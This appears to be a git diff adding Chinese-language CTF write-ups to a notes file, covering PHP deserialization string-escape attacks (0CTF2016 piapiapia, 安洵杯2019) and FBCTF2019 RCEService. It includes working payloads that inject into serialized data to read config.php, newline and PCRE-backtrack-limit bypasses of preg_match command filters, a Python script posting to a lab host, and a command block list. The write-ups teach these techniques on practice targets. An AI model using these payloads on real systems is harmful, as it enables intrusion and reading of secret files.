@@ -524,7 +524,9 @@
         >?  
     ```
 
-## 安洵杯2019(序列化-字符串逃逸+extract()变量覆盖)
+## (序列化-字符串逃逸)
+
+### 安洵杯2019 easy_serialize_php(extract()变量覆盖)
 
 ```php
     function filter($img){
@@ -572,6 +574,178 @@ so:
 ```
 
 本地序列化结果: `a:2:{s:10:"img";s:50:";s:3:"111";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}`
+
+### 0CTF2016 piapiapia(备份文件泄露)
+
+1. dirsearch 扫描，发现`www.zip`,发现源码
+2. 首先看看config.php，里面有个flag变量
+   
+   ```php
+   $config['hostname'] = '127.0.0.1';
+   $config['username'] = 'root';
+   $config['password'] = '';
+   $config['database'] = '';
+   $flag = '';
+   ```
+
+   然后是profile.php
+
+   ```php
+   $profile = unserialize($profile);
+   $phone = $profile['phone'];
+   $email = $profile['email'];
+   $nickname = $profile['nickname'];
+   $photo = base64_encode(file_get_contents($profile['photo']));
+   ```
+
+   发现一个敏感函数
+   `file_get_contents()`(将一个文件读取到一个字符串中)
+   还对`$profile`变量进行了反序列化
+   这里我们就有了一个思路，可以使用`file_get_contents`函数读取`config.php`呢。这时候我们再找找`$profile`变量是什么传递过来的
+
+   ```php
+   $profile=$user->show_profile($username);
+   ```
+
+   继续跟踪`show_profile`方法，因为`profile.php`包含了`class.php`，所以我们去`class.php`寻找
+
+   ```php
+      public function show_profile($username) {
+         $username = parent::filter($username);
+         $where = "username = '$username'";
+         $object = parent::select($this->table, $where);
+         return $object->profile;
+      }
+   ```
+
+   发现它对username变量进行了一些处理，调用了父类`filter`方法
+
+   ```php
+   public function filter($string) {
+		$escape = array('\'', '\\\\');
+		$escape = '/' . implode('|', $escape) . '/';
+		$string = preg_replace($escape, '_', $string);
+		$safe = array('select', 'insert', 'update', 'delete', 'where');
+		$safe = '/' . implode('|', $safe) . '/i';
+		return preg_replace($safe, 'hacker', $string);
+	}
+   ```
+
+   username变量进行处理之后，再调用父类的select方法
+
+   ```php
+   public function select($table, $where, $ret = '*') {
+		$sql = "SELECT $ret FROM $table WHERE $where";
+		$result = mysql_query($sql, $this->link);
+		return mysql_fetch_object($result);
+	}
+   ```
+
+   到这里线索似乎就断了，再先看看其他的php
+   这里看到`update.php`里面有个`serialize`(序列化操作)
+
+   ```php
+   $user->update_profile($username, serialize($profile));
+   ```
+
+   调用了`class.php`中user子类的`update_profile`方法，这时我们回到`class.php`
+
+   ```php
+   public function update_profile($username, $new_profile) {
+      $username = parent::filter($username);
+      $new_profile = parent::filter($new_profile);
+      $where = "username = '$username'";
+      return parent::update($this->table, 'profile', $new_profile, $where);
+   }
+   ```
+
+   还是经过父类filter方法的处理，继续跟进父类的update方法
+
+   ```php
+   public function update($table, $key, $value, $where) {
+      $sql = "UPDATE $table SET $key = '$value' WHERE $where";
+      return mysql_query($sql);
+   }
+   ```
+
+   首先数据经过序列化传入到数据库，然后取出的时候反序列化，那么势必需要传入参数，并且构造恶意参数吧，而update.php这个页面我们可以看到是一个数据传入的页面，那么我们就来看看是否存在漏洞。
+
+   ```php
+   if(!preg_match('/^\d{11}$/', $_POST['phone']))
+	   die('Invalid phone');
+
+   if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
+      die('Invalid email');
+         
+   if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
+      die('Invalid nickname');
+   ```
+
+   可以看到前两个参数好像都没什么办法绕过，但第三个参数好像可以绕过
+
+   这里我们可以发现前面的正则时匹配所有字母和数字，也就是nickname是字母和数字的话，就是真，而strlen()函数可以使用数组绕过，这样一来nickname就完全被我们控制了。
+
+   ```php
+   $profile['phone'] = $_POST['phone'];
+   $profile['email'] = $_POST['email'];
+   $profile['nickname'] = $_POST['nickname'];
+   $profile['photo'] = 'upload/' . md5($file['name']);
+   $user->update_profile($username, serialize($profile));
+   ```
+
+3. 构造payload
+   
+   由于需要利用file_get_contents函数读取config.php
+
+   ```php
+   <?php
+   $profile['phone'] = '18888888888';
+   $profile['email'] = 'admin@qq.com';
+   $profile['nickname'] = 'admin';
+   $profile['photo'] = 'eval.jpg';
+   echo serialize($profile);
+   ```
+
+   我们需要使序列化的结果为
+
+   ```php
+   a:4:{s:5:"phone";s:11:"18888888888";s:5:"email";s:12:"admin@qq.com";s:8:"nickname";s:5:"admin";s:5:"photo";s:10:"config.php";}
+   ```
+
+   我们可以控制admin，所以我们可以让nickname为：
+
+   ```php
+   ";}s:5:"photo";s:10:"config.php";}
+   # 数组序列化之后会多一层`{}`所以再第一个`s`前多了一个`}`
+   ```
+
+   序列化结果：
+
+   ```php
+   a:4:{s:5:"phone";s:11:"18888888888";s:5:"email";s:12:"admin@qq.com";s:8:"nickname";s:34:""};s:5:"photo";s:10:"config.php";}";s:5:"photo";s:8:"eval.jpg";}
+   ```
+
+   此时的payload是无法反序列化的，因为还少34个字符
+
+   ```php
+   public function filter($string) {
+      $escape = array('\'', '\\\\');
+      $escape = '/' . implode('|', $escape) . '/';
+      $string = preg_replace($escape, '_', $string);
+      $safe = array('select', 'insert', 'update', 'delete', 'where');
+      $safe = '/' . implode('|', $safe) . '/i';
+      return preg_replace($safe, 'hacker', $string);
+   }
+   ```
+
+   这里我们发现select,insert,update,delete都是六个字符，唯独where是五个字符，而把where替换成hacker，则多出来一个字符正好可以填充，那么使用34个where就可以解决这个问题
+
+   最终payload
+
+   ```php
+   wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
+   ```
+
 
 ## SUCTF2019 CheckIn(文件上传漏洞)
 
@@ -2756,3 +2930,85 @@ url解码之后就是 `?code=phpinfo();`
    ```
 
    得到PIN码后，利用python执行系统命令`os.popen('系统命令').read()`获取flag，如：`os.popen('cat /this_is_the_flag.txt').read()`
+
+## FBCTF2019 RCEService(RCE)
+
+   **PHP利用PCRE回溯次数限制绕过某些安全限制，多行绕过preg_match函数**
+
+   源码(buuoj中没有提供，原竞赛提供了源码)
+
+   ```php
+   <?php
+   putenv('PATH=/home/rceservice/jail');
+
+   if (isset($_REQUEST['cmd'])) {
+   $json = $_REQUEST['cmd'];
+
+   if (!is_string($json)) {
+      echo 'Hacking attempt detected<br/><br/>';
+   } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
+      echo 'Hacking attempt detected<br/><br/>';
+   } else {
+      echo 'Attempting to run command:<br/>';
+      $cmd = json_decode($json, true)['cmd'];
+      if ($cmd !== NULL) {
+         system($cmd);
+      } else {
+         echo 'Invalid input';
+      }
+      echo '<br/><br/>';
+   }
+   }
+   ?>
+   ```
+
+   除了`ls`其他函数都被禁了
+
+- 解法一
+
+   **因为`preg_match`只能匹配第一行，所以这里可以采用多行绕过。此方法针对`preg_match`函数。**
+
+   题目中存在`\x00-\x7f`,会匹配掉一个`%0a`，在payload前后加几个%0a就行了。这种主要针对`%0a`在`{}`外侧。
+
+   因为`putenv('PATH=/home/rceservice/jail');`修改了环境变量，所以只能使用绝对路径使用cat命令，cat命令在`/bin`文件夹下
+
+   Linux命令的位置：`/bin`,`/usr/bin`，默认都是全体用户使用，`/sbin`,`/usr/sbin`,默认root用户使用
+
+   我们使用payload `{%0A"cmd":"ls /home/rceservice/jail"%0A}` （%A是换行）得到回显 ls 一个文件，这也再一次说明当前环境下有 ls命令 没有其它命令。
+
+   使用payload `{%0A"cmd":"ls /home/rceservice"%0A}` 得到回显，flag jail 。也就是说 flag 在flag里。
+
+   使用`{%0A"cmd":"/bin/cat /home/rceservice/flag"%0A}` 得到flag。
+
+
+   ```url
+   ?cmd={%0A"cmd":"ls /home/rceservice"%0A}
+   or
+   ?cmd=%0A%0A{"cmd":"ls /home/rceservice"}%0A%0A
+   ```
+
+- 解法二
+
+   **利用PCRE回溯来绕过 preg_match，这种方法主要针对正则表达式**
+
+   [PCRE回溯](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)
+
+   1. 由上面的方法知道了，想要得到flag要访问/bin/cat /home/rceservice/flag 。
+   2. 根据PCRE回溯的方法解题，需要用POST发送请求，因为GET会因为头太大报错。
+
+   ```html
+   414 Request-URI Too Large
+   ```
+
+   3. 所以我们使用的脚本如下：
+
+   ```python
+   import requests
+
+   payload = '{"cmd":"/bin/cat /home/rceservice/flag ","nayi":"' + "a"*(1000000) + '"}' ##超过一百万，这里写一千万不会出结果。
+
+   res = requests.post("http://b27f0703-fe79-470f-b1fb-f7cfbd8c966b.node3.buuoj.cn/", data={"cmd":payload})
+   print(res.text)
+   ```
+
+   即可得到flag
